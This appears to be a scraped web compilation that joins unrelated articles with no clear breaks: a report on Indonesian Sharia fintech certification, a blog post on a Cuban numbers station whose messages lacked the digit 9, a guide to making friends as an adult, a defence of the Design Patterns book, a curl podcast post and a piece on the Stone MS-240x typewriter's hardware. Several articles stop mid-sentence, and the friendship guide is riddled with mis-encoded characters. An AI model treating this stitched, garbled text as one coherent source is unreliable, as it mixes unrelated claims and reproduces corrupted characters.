<p>Some clerics have argued that <a href="http://www.ikim.gov.my/new-wp/index.php/2019/08/22/some-sharia-considerations-concerning-e-wallet/">digital wallets are a form of <em>haram</em></a>, a term for practices forbidden by Islamic law<em>. </em>The<em> </em>digital-only cash-back rebates and other discounts with partner retailers commonly found on these apps are considered, by some clerics, a form of interest payment between businesses — riba in disguise. MUI has ruled sending and storing money in digital wallets acceptable, but only under strict terms.&nbsp;</p>



<figure><blockquote><p>To earn a certificate, new startups must adhere to the council’s combined 154 fatwas, a rule book for anyone attempting to build Sharia fintech.</p></blockquote></figure>



<p>After conducting a rigorous product-proposal review, MUI appointed a three-member supervisory board to Djaenudin’s team well-versed in the nuances of its rulings. The board included Anwar Abbas, chairman of an Islamic reformist organization in Southern Java’s Yogyakarta and author of a national bestseller promoting the vice president’s “Shariatization” worldview, <a href="https://www.tokopedia.com/dojobuku/ma-ruf-amin-way-sahala-panggabean-by-anwar-abbas"><em>The Ma’ruf Amin Way</em></a><em>. </em>“They are all Sharia experts,” said Djaenudin. “They gave us guidance and consultations about the product.” </p>



<p>Starting in November 2019, shortly after the vice president’s Shariatization initiative, Djaenudin was required to brief these scholars on market research, product testing, and the ins and outs of engineering every month. MUI’s supervisory board would share their insights and ensure the technological infrastructure of the app followed MUI’s rulings.&nbsp;</p>



<p>An MUI fatwa issued in 2017 was of particular concern to Djaenudin. <a href="https://drive.google.com/file/d/1KPAvhhziJ61Pt8EFxxTFfDPNmRHJoQDG/view">Fatwa No. 116</a> begins with verses from the Quran published in both classical Arabic script and Bahasa Indonesian. “O you who have believed, when you contract a debt for a specified term, write it down. And let a scribe write it between you in justice,” reads one verse. They are followed closely by <a href="https://yaqeeninstitute.org/emadhamdeh/are-hadith-necessary/">quotations from books of <em>hadith</em></a>, records of the sayings of the Prophet Muhammad: “Do not sell gold for gold, and do not sell silver for silver, except in case of like for like.”</p>



<p>These threads of theological precedent are woven together to create a set of rulings reinterpreting classical verse for the new digital economy. According to the fatwa, these Quranic lines have a specific implication for fintech: floating funds must be housed in certified Islamic banks. Contracts between all parties — users, banking institutions, or the app itself — must be grounded in Sharia contract law. Any promotional campaign cannot include riba.</p>

<p>The supervisory board had other suggestions for LinkAja’s parallel Sharia platform, Djaenudin told <em>Rest of World</em>. The new version of the app embedded a <em>zakat </em>payment feature, <a href="https://www.islamic-relief.org.uk/about-us/what-we-do/zakat/">a form of religious tithing and worship</a> performed through charitable donations, customarily amounting to 2.5% of one’s total savings. After the board signed off on the feature, LinkAja partnered with 240 MUI-approved charitable institutions and 1,000 mosques nationwide <a href="https://news.detik.com/adv-nhl-detikcom/d-5019749/wahai-umat-muslim-ini-cara-mudah-berzakat-lewat-layanan-syariah-linkaja">to launch the zakat feature</a>. Months of vetting culminated in a full audit of LinkAja’s operations at its Jakarta headquarters by MUI.&nbsp;</p>



<p>According to Widjayanto, LinkAja paid a $300 (4 million rupiah) charge to MUI for its Sharia certificate, which lasts three years, including a $20 transportation fee for the auditor.&nbsp;</p>



<p>LinkAja Sharia Services <a href="https://www.idnfinancials.com/news/33503/link-aja-launches-linkaja-sharia-services">launched on April 14</a>, just one week before the start of Ramadan. In its first month, it saw 100,000 user registrations. Djaenudin credits the MUI Sharia certificate for this first wave of customers. Most Indonesians prefer to use a Sharia-branded service, even if few understand the particulars of riba or mudarabah, according to LinkAja market research. “From the customer’s perspective, as long as they see the halal logo or Sharia certificate from a trusted body, which is MUI, it gives them clearance and trust,” said Djaenudin.</p>



<p>For Indonesian fintech entrepreneurs hoping to establish their Sharia credentials, the MUI certificate has become the gold standard. Ronald Yusuf Wijaya, the founder of two Sharia-compliant crowdfunding startups, converted to Islam while building his business. “It’s been almost nine years, and I’m learning all of this from the day I started my business,” he said. Wijaya is chairman of the <a href="https://fintechsyariah.id/en">Indonesian Sharia Fintech Association (AFSI)</a>, a trade association that lobbies on behalf of <a href="https://www.reuters.com/article/us-indonesia-digitalpayments-islam/sharia-fintech-startups-race-to-tap-indonesia-growth-by-aligning-with-islam-idUSKBN20Q0IA">this burgeoning pocket of the Indonesian economy</a>. Since converting, Wijaya has successfully navigated MUI Sharia certification with both his companies. “Some customers, they ask, ‘Are you certified, or are you just Sharia?’”&nbsp;</p>

<p>For most Sharia fintech startups, MUI certificates are not only commercially advantageous but legally required by the Financial Services Authority of Indonesia (OJK), the state financial regulator. Other areas of the Sharia digital economy, like <a href="https://www.salaamgateway.com/story/indonesian-e-commerce-giant-tokopedia-aiming-for-10-of-total-transactions-to-come-from-new-islamic-m">halal e-commerce</a> and <a href="https://www.salaamgateway.com/story/indonesia-gets-first-diy-umrah-platform-e-commerce-giant-starts-selling-pilgrimage-packages"><em>umrah </em>sites</a>, travel-booking platforms for Islamic pilgrimages, do not require this certificate.&nbsp;</p>



<p>Dr. Ir. H. Nadratuzzaman Hosen, vice chair of DSN MUI, told <em>Rest of World</em> that MUI is a passive actor in the development of new apps — waiting idly for companies to seek its approval rather than imposing fatwas on companies as a theocratic …</p></div></div>

		<p>18 September 2020</p><p>A Cryptologic Mystery</p>
	<p>Did a broken random number generator in Cuba help expose a Russian espionage network?</p>




	
<p>
I picked up the new book <em>Compromised</em> last week and was intrigued to discover that it may have shed some light on a small (and rather esoteric) cryptologic and espionage mystery that I've been puzzling over for about 15 years. <em>Compromised</em> is primarily a memoir of former FBI counterintelligence agent Peter Strzok's investigation into Russian operations in the lead up to the 2016 presidential election, but this post is not a review of the book or concerned with that aspect of it.
</p><p>
Early in the book, as an almost throwaway bit of background color, Strzok discusses his work in Boston investigating the famous Russian "illegals" espionage network from 2000 until their arrest (and subsequent exchange with Russia) in 2010. "Illegals" are foreign agents operating abroad under false identities and without official or diplomatic cover. In this case, ten Russian illegals were living and working in the US under false Canadian and American identities. (The case inspired the recent TV series <em>The Americans</em>.)
</p><p>
Strzok was the case agent responsible for two of the suspects, Andrey Bezrukov and Elena Vavilova (posing as a Canadian couple under the aliases Donald Heathfield and Tracey Lee Ann Foley). The author recounts watching from the street on Thursday evenings as Vavilova received encrypted shortwave "numbers" transmissions in their Cambridge, MA apartment.
</p><p>
Given that Bezrukov and Vaviloa were indeed, as the FBI suspected, Russian spies, it's not surprising that they were sent messages from headquarters using this method; numbers stations are part of time-honored espionage tradecraft for communicating with covert agents. But their capture may have illustrated how subtle errors can cause these systems to fail badly in practice, even when the cryptography itself is sound.
<br>
<a name="fold">&nbsp;</a></p><hr size="1"><p>
	

First, a bit of background. For at least the last sixty years, encrypted shortwave radio transmissions have been a standard method for sending messages to covert spies abroad. Shortwave radio has several attractive properties here. It covers long distances; it's possible for a single transmitter to get hemispheric or even global coverage. Shortwave radio receivers, while less common than they once were, are readily available commercially in almost every country and are not usually suspicious or alerting to possess. And while it's relatively easy to tell where a shortwave signal is coming from, their wide coverage area makes it very difficult to infer exactly who or where the intended recipients might be. Both the US (and its allies) and the Soviet Union (and its satellites) made extensive use of shortwave radio for communicating with spies during the cold war, and enigmatic "numbers" transmissions aimed at spies continue to this day.
</p><p>
The encryption method of choice used by numbers stations is called a "one time pad" (OTP) cipher. OTPs have unique advantages over other encryption methods. Used properly, they are <em>unconditionally</em> secure; no amount of computing power or ingenuity can "break" them without knowledge of the secret key. Also, they are almost deceptively low tech. It is possible to encrypt and decrypt OTP messages by hand with nothing more than paper and pencil and simple arithmetic. The disadvantage is that OTPs are cumbersome; you need a secret key as long as all the messages you will ever send, with no part of the key ever re-used for multiple messages. Typically, the key would be printed as a series of digits bound into a pad of paper, with each page removed after use; hence the name "one time pad". OTPs can be difficult in practice to use properly and are quite vulnerable if used improperly; more on that later.
</p><p>
The OTP messages sent to spies by shortwave radio typically consist of decimal digits broadcast in either a mechanically recorded voice or in morse code (more recently, digital transmissions are also used) on designated frequencies at designated times, usually in four or five digit groups (hence the term "numbers station"). After copying and verifying a header in the message, the agent would remove the corresponding page from their secret OTP codebook and add each key digit to each corresponding message digit using modulo-10 arithmetic (without carry). The resulting "plaintext" digits are then converted to text with a simple substitution encoding (e.g, A=01, B=02, etc., although other encodings are generally used). That's all there is to it. The security of the system depends entirely on the uniqueness and secrecy of the OTP codebook pad given to each agent.
</p><p>
To prevent "traffic analysis" that might reveal to an observer the number of active agents or the volume of messages sent to them, numbers stations typically operate on rigidly fixed schedules, sending messages at pre-determined times whether there is actually a message to be sent or not. When there is no traffic for a given timeslot, random dummy "fill" traffic is sent instead. The fill traffic should be indistinguishable to an outsider from real messages, thereby leaking nothing about how often or when the true messages are being sent. But more on this later.
</p><p>
None of this is by itself news. The existence of numbers stations has been publicly known (and tracked by hobbyists) since at least the 1960's, and OTPs are an elementary cryptographic technique known to every cryptographer. However, Strzok mentions two interesting details I'd not seen published previously and that may solve a mystery about one of the most well known numbers stations heard in North America.
</p><p>
First, <em>Compromised</em> reveals that the FBI found that during at least some of the time the illegals were under investigation, the Russian numbers intended for them were sent not by a transmitter in Russia (which might have difficulty being reliably received in the US), but relayed by the <em>Cuban</em> shortwave numbers station. This is perhaps a bit surprising, since the period in question (2000-2010) was well after the Soviet Union, the historic protector of Cuba's government, had ceased to exist.
</p><p>
The Cuban numbers station is somewhat legendary. It is a powerful station, operated by Cuba's intelligence directorate but co-located with Radio Habana's transmitters near Bauta, Cuba, and is easily received with even very modest equipment throughout the US. While its numbers transmissions have taken a variety of forms over the years, during the early 2000's it operated around the clock, transmitting in both voice and morse code. The station was (and remains) so powerful and widely heard that radio hobbyists quickly derived its hourly schedule. During this period, each scheduled hourly transmission consisted of a preamble followed by three messages, each made up entirely of a series of five digit groups (with by a brief period of silence separating the three messages). The three hourly messages would take a total of about 45 minutes, in either voice or morse code depending on the scheduled time and frequency. Every hour, the same thing, predictably right on schedule (with fill traffic presumably substituted for the slots during which there was no actual message).
</p><p>
If you want to hear what this sounded like, here's a recording I made on October 4, 2008 of one of the hourly voice transmissions, as received (static and all) in my Philadelphia apartment: <a target="_blank" href="https://www.mattblaze.org/private/17435khz-200810041700.mp3"><tt>www.mattblaze.org/private/17435khz-200810041700.mp3</tt></a>. The transmission follows the standard Cuban numbers format of the time, starting with an "Atenćion" preamble listing three five-digit identifiers for the three messages that follow, and ending with "Final, Final". In this recording, the first of the three messages (64202) starts at 3:00, the second (65852) at 16:00, and the third (86321) at 29:00, with the "Final" signoff at the end. The transmissions are, to my cryptographic ear at least, both profoundly dull and yet also eerily riveting. 
</p><p>
And this is where the mystery I've been wondering about comes in. In 2007, I noticed an odd anomaly: some messages completely lacked the digit 9 ("nueve"). Most messages had, as they always did and as you'd expect with OTP ciphertext, a uniform distribution of the digits 0-9. But other messages, at random times, suddenly had no 9s at all. I wasn't the only (or the first) person to notice this; apparently the 9s started disappearing from messages some time around 2005.
</p><p>
This is, to say the least, very odd. The way OTPs work should produce a uniform distribution of all ten digits in the ciphertext. The odds of an entire message lacking 9s (or any other digit) are infinitesimal. And yet such messages were plainly being transmitted, and fairly often at that. In fact, in the recording of the 2008 transmission linked to above, you will notice that while the second and third messages use all ten digits, the first is completely devoid of 9s.
</p><p>
I remember concluding that the most likely, if still rather improbable, explanation was that the 9-less messages were dummy fill traffic and that the random number generator used to create the messages had a bug or developed a defect that prevented 9s from being included. This would be, to say the least, a very serious error, since it would allow a listener to easily distinguish fill traffic from real traffic, completely negating the benefit of having fill traffic in the first place. It would open the door to exactly the kind of traffic analysis that the system was carefully engineered to thwart. The 9-less messages went on for almost ten years. (If I were reporting this as an Internet vulnerability, I would dub it the "Nein Nines" attack; please forgive the linguistic muddle). But I was resigned to the likelihood that I would never know for sure.
</p><p>
And this brings us to the second observation from Strzok's book.
</p><p>
<em>Compromised</em> doesn't say anything about missing nueves, but he does mention that the FBI exploited a serious tradecraft error on the part of the sender: the FBI was able …</p></div></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section><div><h2 data-guide-section-number="1"><span>Need to know</span></h2><div><p>Friends are a treasure. In an uncertain world, they provide a comforting sense of stability and connection. We laugh together and cry together, sharing our good times and supporting each other through the bad. Yet a defining feature of friendship is that itâ€™s voluntary. Weâ€™re not wedded together by law, or through blood, or via monthly payments into our bank accounts. It is a relationship of great freedom, one that we retain only because we want to.</p>
<p>But the downside of all this freedom, this lack of formal commitment, is that friendship often falls by the wayside. Our adult lives can become a monsoon of obligations, from children, to partners, to ailing parents, to work hours that trespass on our free time. A <a href="https://psycnet.apa.org/doiLanding?doi=10.1037%2Febs0000046">study</a> of young adultsâ€™ social networks by researchers at the University of Oxford found that those in a romantic relationship had, on average, two fewer close social ties, including friends. Those with kids had lost out even more. Friendships crumble, not because of any deliberate decision to let them go, but because we have other priorities, ones that arenâ€™t quite as voluntary. The title of the Oxford paper summed up things well: â€˜Romance and Reproduction Are Socially Costlyâ€™.</p>
<p>Such is the pace and busyness of many peopleâ€™s adult lives that they can lose contact with their friends at a rapid rate. For instance, a <a href="https://www.sciencedirect.com/science/article/pii/S0378873313001056?via%3Dihub">study</a> by the Dutch sociologist Gerald Mollenhorst found that, over a period of seven years, people had lost touch with half of their closest friends, on average. Whatâ€™s especially alarming is that many of us seem to be losing friends faster than we can replace them. A <a href="https://psycnet.apa.org/record/2012-13785-001">meta-analysis</a> by researchers in Germany published in 2013 combined data from 177,635 participants across 277 studies, concluding that friendship networks had been shrinking for the preceding 35 years. For example, in studies conducted between 1980 and 1985, participants reportedly had four more friends on average, compared with the participants whoâ€™d taken part in studies between 2000 and 2005.</p>
<p>If weâ€™re not careful, we risk living out our adulthoods friendless. This is a situation thatâ€™s worth avoiding. Friends are not only a great source of fun and <a href="https://www.pewforum.org/2018/11/20/where-americans-find-meaning-in-life/">meaning</a> in life, but studies <a href="https://academic.oup.com/psychsocgerontology/article/74/2/222/3760165">suggest</a> that, without them, weâ€™re also at greater risk of feeling more depressed. Itâ€™s telling that in their <a href="https://journals.sagepub.com/doi/10.1111/1467-9280.00415">study</a> â€˜Very Happy Peopleâ€™ (2002), the American psychologists Ed Diener and Martin Seligman found that a key difference between the most unhappy and most happy people was how socially connected they were. Friends give us so much, which is why we need to invest in making them. Hereâ€™s how.</p></div></div></section><section><div><h2 data-guide-section-number="2"><span>What to do</span></h2><div><p>Making more friends in adulthood is going to take some deliberate effort on your part. Itâ€™s an exciting challenge in theory, but one of the first obstacles youâ€™ll encounter is having enough confidence. Especially if you are shy by nature, putting yourself out there can seem scary, triggering fears of rejection. These fears might lead you to engage in two types of avoidance that will inhibit your ability to make friends. First, you might practise â€˜overt avoidanceâ€™, by not putting yourself in situations where itâ€™s possible to meet new people. Instead of going to your friendâ€™s movie night, with the chance to meet others, you end up staying at home. Second, you might find yourself engaging in â€˜covert avoidanceâ€™, which means that you show up but donâ€™t engage with people when you arrive. You go to the movie night, but while everyone else is analysing the film after itâ€™s over, you stay silent in the corner, petting someoneâ€™s pet corgi and scrolling through Instagram.</p>
<p><strong>Assume that people like you</strong></p>
<p>Both these forms of avoidance are caused by understandable fears of rejection. So imagine how much easier it would be if you knew that, were you to show up in a group of strangers, most of them would love you and find you interesting. This mindset actually has a self-fulfilling quality â€“ an American <a href="https://doi.apa.org/doiLanding?doi=10.1037%2F0022-3514.51.2.284">study</a> from the 1980s found that volunteers who were led to believe that an interaction partner liked them began to act in ways that made this belief more likely to come true â€“ they shared more about themselves, disagreed less, and had a more positive attitude. This suggests that if you go into social situations with a positive mindset, assuming people like you, then itâ€™s more likely that this will actually turn out to be the case.</p>
<p>Of course, you might still be reluctant to assume others like you because you donâ€™t believe itâ€™s true. If this is you, you might take comfort from research that found, on average, that strangers like us more than we realise. The <a href="https://journals.sagepub.com/doi/10.1177/0956797618783714">paper</a>, by Erica J Boothby at Cornell University and colleagues, involved having pairs of strangers chat together for five minutes, to rate how much they liked their interaction partner, and to estimate how much their partner liked them. Across a variety of settings and study durations â€“ in the lab, in a college dorm, at a professional development workshop â€“ the same pattern emerged. People underestimated how much they were liked, a phenomenon that Boothby and her colleagues labelled â€˜the liking gapâ€™.</p>
<p>What wisdom should we take from this research? It can remind us to go into new social events assuming that people will like us. It can keep us from being paralysed by fears of rejection, pushing us to question some of these fears. Try working on your internal dialogue, your inner voice that perhaps makes overly negative assumptions about how people will respond to you. Doing this will help give you the confidence to go out there and start initiating friendly contact with strangers.</p>
<p><strong>Initiate</strong></p>
<p>In <em>We Should Get Together: The Secret to Cultivating Better Friendships</em> (2020), Kat Vellos describes being inspired to write her book after a moment of feeling utterly alone. She was looking for a friend to hang out with, so she posted on Facebook: â€˜Who wants to go eat French fries and talk about life with me?â€™ Everyone who responded lived in another state; her local San Francisco Bay Area friends were all booked up. As she put it:</p>
<blockquote>I didnâ€™t just want to eat snacks and talk about life. I was craving a different kind of life â€“ one that would give me abundant access to friends who wanted to see me as much as I wanted to see them.</blockquote>
<p>This experience made Vellos realise that she needed more friends, so she created and executed a plan to make some. Eventually, she was running two successful meetup groups, and had established friendships with people she liked and wanted to get closer to. How did she change her life? She initiated. Vellos set aside time to reach out to people regularly, to revitalise old relationships and to awaken new ones, to check in, to find time to hang out. Her story reveals how initiative can change the course of our friendships.</p>
<p>To embrace the importance of initiating, you must to let go of the myth that friendship happens organically. You have to take responsibility rather than waiting passively. Science backs this up. Consider a <a href="https://journals.sagepub.com/doi/pdf/10.1177/0265407509106718">study</a> of older adults in the Canadian province of Manitoba. The participants who thought friendship was something that just happened based on luck tended to be less socially active and to feel lonelier when the researchers caught up with them five years later. By contrast, those who thought friendship took effort actually made more effort â€“ for example, by showing up at church or at community groups â€“ and this paid dividends, in that they felt less lonely at the five-year follow-up.</p>
<p>But itâ€™s not just showing up that matters, itâ€™s saying â€˜helloâ€™ when you get there. This means introducing yourself to other people, asking them for their phone numbers, following up and asking them to hang out. Initiating is a process, one that we must do over and over again to make new friendships.</p>
<p>Initiation is particularly important for people who find themselves in new social settings â€“ such as people who have moved to a new city, started a new school or job. In a <a href="https://psycnet.apa.org/record/1987-97266-009">study</a> of first-year undergraduates at the University of Denver in 1980, it was those students who rated themselves as having superior social skills who managed to develop more satisfying social relationships. Moreover, in the Fall, when everyone was new, it was specifically â€˜initiation skillâ€™ that was most important. Once friendships were more stable, it didnâ€™t matter as much.</p>
<p>Although we might fear that other people will turn us down if we initiate with them, the research finds that this is a lot less likely than we might think. When the American psychologists Nicholas Epley and Juliana Schroeder <a href="https://psycnet.apa.org/record/2014-28833-001">asked</a> research participants to open up conversations with their fellow train commuters, can you guess how many of them were shot down? None! Epley and Schroder concluded that: â€˜Commuters appeared to think that talking to a stranger posed a meaningful risk of social rejection. As far as we can tell, it posed no risk at all.â€™</p>
<p><strong>Keep showing up</strong></p>
<p>Once youâ€™ve initiated some new contacts, the challenge of turning them into genuine friendships begins. I learned this lesson when I moved to Atlanta to start a job as assistant professor. At first, I was proactive at making friends. I showed up to events, asked my friends if they knew anyone in the area, and went to some meetup groups. I met a few people, but most of these friendships fizzled. I was good at sparking a connection but struggled to sustain it.</p>
<p>According to Rebecca G Adams, professor of sociology and gerontology at the University of North Carolina at Greensboro, sociologists have long <a href="https://www.nytimes.com/2012/07/15/fashion/the-challenge-of-making-friends-as-an-adult.html">recognised</a> that friendships thrive when we have continuous interaction. My problem with sustaining connection was that I lacked the opportunity for repeated encounters. Going to a lecture, or a happy hour, or a networking event afforded me only one opportunity to connect. If you can, itâ€™s a better idea to sign up for activities that give you multiple opportunities to connect, such as a language class, a writing course, an …</p></div></div></section></div></div>

<h3>
  18 September 2020
</h3>


  <p>In a few months, I’ll celebrate my fifth year as a professional - understand paid - software engineer. I find this role to be a right balance of technical skills, human relationships and it fulfils my curiosity. As time goes by, I’m also starting to be disappointed by some of its negative aspects. While it doesn’t prevent me from sleeping, I think an effort could be made to challenge some lousy and short-sighted comments we see daily on social platforms.</p>
<p>Today, I’d like to talk about <a href="https://www.amazon.com/Design-Patterns-Object-Oriented-Addison-Wesley-Professional-ebook/dp/B000SEIBB8">Design Patterns: Elements of Reusable Object-Oriented Software</a>, a book written by Erich Gamma, Richard Helm, Ralph Johnson, and John Vlissides, famously known as the <em>Gang of Four</em>. If you never read it: this is a fundamental programming book describing programming abstractions published in 1994. The date is essential here, but we’ll come to that later.</p>
<p>This book has recently been discussed by many, due to <a href="https://twitter.com/unclebobmartin/status/1306581616983183361">a recent tweet from Robert. C. Martin aka Uncle Bob</a>. Long story short, telling a massive audience that book X is great, and treating people who consider it outdated as “foolish” does not end well.</p>
<p>While I disagree with the tone here, I’d like to focus on the negative comments which followed, including but not limited to:</p>
<ul>
<li>the book is outdated</li>
<li>its concepts are outdated</li>
<li>its authors said it’s outdated</li>
<li>the book is only focused on mid-90s C++ developers</li>
<li>no one ever used the “flyweight” design pattern</li>
<li>the book is not even readable</li>
<li>its abstractions make code unreadable</li>
</ul>
<p>First of all, let’s get back to 1994. I was two at the time. All Internet websites could probably fit on a floppy disk, Jeff Bezos founded Amazon, Rasmus Lerdorf was only starting to work on its <em>Personal Home Page/Forms Interpreter</em> CGI C program, and Larry Page and Sergey Brin would only start their research project for a web search engine two years later. The biggest technology companies were IBM, Hewlett-Packard, Motorola and Xerox, which mostly sat behind the oil, car, and food industries. Programming existed, but it wasn’t the same field as we know it today. Tech companies were a few, and I assume a lot of programmers were working in other industries. Being a professional in this sector was arguably more difficult then, and knowledge was not as easily accessible as it is today. This book was published in a world where programming started to spread in many industries. It surely was a very good resource, to try to apply its concepts, and see what works and what doesn’t. The authors were literally inventing the field at the time: Erich Gamma, for instance, teamed up with Kent Beck to create the Java JUnit test framework just a few years later, which hugely helped to popularise testing.</p>
<p>My point is: let’s remind ourselves we stand on the shoulders of many people who tried and experimented a lot at the time. We too often take for granted the knowledge and productivity we have today. On top of that, let’s not be disrespectful towards the previous generation. My father and my grandfather both work(ed) as electricians: never did my father complain about his father’s tools or habits before him. He learned them and perfected them with modern knowledge.</p>
<p>Now about the book in itself. While I agree with people saying that some design patterns are too abstract, I strongly disagree with the ones saying the whole book is outdated. Should you develop in a OO language today, such as Java, C++, Python or Ruby, or even more notably, develop a framework or a tool <em>for</em> developers, I think this book is still highly relevant today.</p>
<p>Here are my top picks from the book and why I chose them.</p>
<p><strong>Builder:</strong> because in OOP, objects often hold too much data in them, you need to control how to instantiate them properly. Even with overloaded constructors, data validation at instantiation can become messy. Do you like your testing framework using a <em>fluent interface</em> with method chaining (<code>assert(...).not().equalTo(...)</code>)? Guess what, it’s directly inspired by the builder design pattern.</p>
<p><strong>Prototype:</strong> I often hear people complaining about how complicated JavaScript is. While I don’t think this language makes it easy for the developer to write non error-prone code, I better understood the language via the lens of its prototype-based nature, precisely described by the prototype design pattern.</p>
<p><strong>Most of the structural patterns:</strong> While everyone is focused on the bad parts of OOP, namely inheritance, all those design patterns are focused on composability. If you want to be cool nowadays, you could say you prefer “composition over inheritance”. Well, if you think composition is only about embedding objects in each other, you should read the part of structural design patterns. For instance, you probably know decorators from Python or annotations in Java/C#, they derive from the decorator design pattern.</p>
<p><strong>Chain of Responsibility:</strong> I think we can all agree on how great it is to use and implement a middleware in our modern web framework. Just use or write functions which take a <em>next</em> handler, a request object. Pass it to your web framework instance via a <code>.use(...)</code> method and you’re done. This is what the Chain of Responsibility pattern is all about. All Rails, Django, and Laravel developers knew that was NIH.</p>
<p><strong>Iterator:</strong> This one seems obvious now, perhaps not so much at a time where iterating on arrays with pointer arithmetic was common. Today, iterators are even buried behind standard libraries to implement even higher abstract functionalities, but they are still there. I don’t see a more universal way to implement, with the same public API, a traversal of an array, a tree, or a graph (they are better ways of iterating those last data structures though).</p>
<p><strong>Observer:</strong> For this last one, here is the verbatim definition from the book: “Define a one-to-many dependency between objects so that when one object changes state, all its dependents are notified and updated automatically”. Now, if we take a look at some modern technologies, doesn’t this resonate with PubSub models or React hooks for instance?</p>
<p>To conclude, I’m not saying the book is not old, quite the opposite: you can feel it when it takes as examples from 90s user interfaces. I’m merely advocating that our industry and its workers have changed a lot in the last 30 years, dare I say even more than in any other industry. But this should not be an excuse to sweep away years of meticulous R&amp;D and documentation, on which our modern tools still rely on nowadays, and the people behind it.</p>
<p>Because a lot of people complained that they were never able to finish the book, here is an extract from the end, section “What to Expect from Design Patterns”, page 351:</p>
<blockquote>
<p>It’s possible to argue that this book hasn’t accomplished much. After all, it doesn’t present any algorithms or programming techniques that haven’t been used before. […] it just documents existing designs. You could conclude that it makes a reasonable tutorial, perhaps, but it certainly can’t offer much to an experienced object-oriented designer.</p>
<p>We hope you think differently. Cataloging design patterns is important. It gives us standard names and definitions for the techniques we use. If we don’t study design patterns in software, we won’t be able to improve them, and it’ll be harder to come up with new ones.</p>
<p>This book is only a start.</p>
</blockquote>

<p><img alt="curl security headlines podcast" src="https://blog.firosolutions.com/shcurl.png"></p><h3 id="summary">Summary:</h3>

<p>In this episode of Security Headlines, we jump into curl with<br>
its founder and maintainer Daniel Stenberg.<br>
We talk security, CI systems, creation of curl, Fuzzing, IRC bots<br>
and a lot more!</p>

<p>Relax, Tune in and enjoy this episode of Security Headlines:</p>







<p><a href="https://anchor.fm/firo-solutions/episodes/Curl-special-with-Daniel-Stenberg-ejqn0g">https://anchor.fm/firo-solutions/episodes/Curl-special-with-Daniel-Stenberg-ejqn0g</a></p>

<p>Few software developers never even get near to having one<br>
of their projects being picked up by a larger community.</p>

<p>A project that started as a currency plugin to an IRC bot.<br>
Spun off and ended up becoming bigger and bigger resulting in being
adopted by over 10 billion devices.  Well, this project is called<br>
curl!  Curl is known to be the stable swizz army knife that can<br>
be used for making various types of transfer requests.</p>

<p>Need to download a file? Curl is here for you<br>
Need to test a socks5 proxy? Curl is here for you<br>
Need to download an ezine over Gopher? Curl is here for you<br>
Need to test a unix socket? Curl is here for you</p>

<p>In this episode of Security Headlines, we are joined by Daniel<br>
Stenberg who is the founder and maintainer of Curl.<br>
He has even been awarded a gold medal by the Swedish king for<br>
his work with Curl.</p>



<p><img alt="curl Daniel stenberg King medal" src="https://blog.firosolutions.com/daniel-king.jpg"></p><p>The curl codebase is around 100 000 lines of C code, filled with<br>
hidden gems such as a libcurl code generator that creates a template<br>
based on the command line arguments you give it.</p>

<p>One of curl’s many features is the –libcurl option which<br>
takes the commmand you give curl and generate a C program that use<br>
libcurl with the same functionally, you can even port it to other<br>
programming languages with a similar syntax and use it with libcurl’s<br>
bindings.</p>

<pre><code>$ curl https://blog.firosolutions.com --libcurl example.c   
$ head example.c 
/********* Sample code generated by the curl command line tool **********
 * All curl_easy_setopt() options are documented at:
 * https://curl.haxx.se/libcurl/c/curl_easy_setopt.html
 ************************************************************************/
#include &lt;curl/curl.h&gt;

int main(int argc, char *argv[])
{
  CURLcode ret;
  CURL *hnd;

</code></pre>

<p>Even Google love Curl, having curl in over 100 devices.<br>
This leads us to Google’s fuzzing project, where they have<br>
an army of computers that feed automated generated data in order<br>
to find bugs.<br>
This has resulted in curl being more stable, secure, and mature.</p>

<p>The world is always moving and so is the technology evolution.<br>
Getting a bit dystopian here, but maybe we will move to a future<br>
where we are running everything in a browser.<br>
A world where everything runs ipv6 and http3.</p>

<p>In that world, I know one tool we can count on.</p>

    <h2>
      Stone MS-240x Typewriter (2): Hardware Design
    </h2> 
    
  </header>
  <!-- /.post-info -->
  <div>
    <p>In case you misseed it -- I talked about the backgrounds of the MS-240x typewriter in the <a href="https://tifan.net/blog/2020/09/09/revealing-a-forgotten-chinese-compute-history-stone-ms240x-chinese-typewritter-1-background/">previous article</a>. In this article, I'm going to discuss the hardware design of the legendary Stone MS-240x Chinese Typewriter (四通 MS-240x 中英文打字机) designed and sold in the mid-1980s.</p>
<p>Both the hardware and the BIOS was designed by ALPS Electric Co. ALPS provided a BIOS reference manual before the development began so that the developers in China could just write an emulator on the PC emulating the ALPS BIOS, and just focus on the development of the word processor.</p>
<div id="the-hardware">
<h2>The Hardware</h2>
<p><img alt="Stone MS-2401H 四通 MS-2401H 打字机" src="https://tifan.net/images/20200917-ms-2401h.jpg"></p><p>(<a href="https://www.lty.me/stone-ms-2401h/">Picture taken by @lty1993</a>)</p>
<p>As I mentioned in the previous article, the hardware is just a 8088 machine in its core. In the 80s, the Japanese engineer reverse engineered and implemented Japanese counterparts of almost all popular chips in the west. The ALPS motherboard is not an exception to that.</p>
<p>I bought the machine on Xianyu (Chinese eBay equivalent) and shipped it to @lty1993 in China for examination, disassembly, and ROM dumps. The machine is quite heavy -- shipping it to the west coast would probably cost 200 USD. Guess there won't be any Stone Chinese Typewriters in the US for a while!</p>
</div>
<div id="processor-nec-v20">
<h2>Processor: NEC V20</h2>
<p>Instead of using the actual 8088 processor, MS-240x series used the NEC V20 running at different clock frequencies. The original MS-2400 clocks at 4.9125 MHz, the upgraded MS-2401 runs at 8 MHz, and the later MS-2401H model runs at 10 MHz.</p>
<p>The V20 is 30% faster than the original 8088 running at the same clock speed, providing additional power for the heavy lifting work a Chinese Typewriters needs to do.</p>
</div>
<div id="memory-hard-wired-memory-map-with-page-control">
<h2>Memory: Hard-wired Memory Map with Page Control</h2>
<p>The RAM itself is not interesting at all. It's just a bunch of Japanese made SRAM connected to the address bus of the processor.</p>
<p>The BIOS is mapped at <cite>0xF8000</cite> to <cite>0xFFFF</cite>, and CPU will execute the instruction at <cite>0xFFFF0</cite> -- that's the convention for 8088. So naturally, the BIOS was hard wired at that address.</p>
<p>Remember we talked about the Chinese fonts? It's a mask ROM, and it is quite large -- larger than the address space of 8088 processor if we include high precision Chinese fonts at 24x24 dot (which is still pretty awful in today's standard). To solve this problem, all external ROMs were divided into 32KB pages. To access any page in the ROM, you would send a command to the ASIC to select the page first (bank switching) before reading memory from the hard wired memory location. Sounds like a MMU? Well, this <em>is</em> a poor man's MMU.</p>
<p>One thing worth noting is that all models have built in battery backup units. Newer models (such as MS-2401) can even operate with battery with up to 3 hours battery life -- it almost makes the typewritter a laptop with a built-in printer.</p>
<p>Here's the memory map for various models of the Chinese typewriter.</p>
